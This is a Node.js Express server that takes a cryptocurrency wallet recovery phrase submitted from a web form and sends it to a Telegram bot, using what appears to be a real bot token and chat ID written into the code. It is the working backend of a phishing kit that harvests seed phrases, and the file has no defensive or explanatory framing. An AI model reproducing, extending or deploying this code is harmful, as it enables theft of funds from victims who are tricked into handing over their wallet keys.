const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/submit', (req, res) => {
    const { recoveryPhrase } = req.body;
    if (!recoveryPhrase) {
        return res.status(400).json({ error: 'Recovery phrase is required' });
    }

    // Send to Telegram (replace YOUR_TELEGRAM_BOT_TOKEN and YOUR_CHAT_ID)
    const telegramBotToken = '8012898137:AAHrkbdZwW7a3qIinIkPq2pgHrNN1pOX_-A';
    const chatId = '1353449624';
    const message = `New recovery phrase: ${recoveryPhrase}`;

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message }),
    })
        .then(response => response.json())
        .then(() => res.status(200).json({ success: true }))
        .catch(err => {
            console.error('Error sending to Telegram:', err);
            res.status(500).json({ error: 'Failed to send message to Telegram' });
        });
});

app.listen(3000, () => {
    console.log('Server running at http://localhost:3000');
});
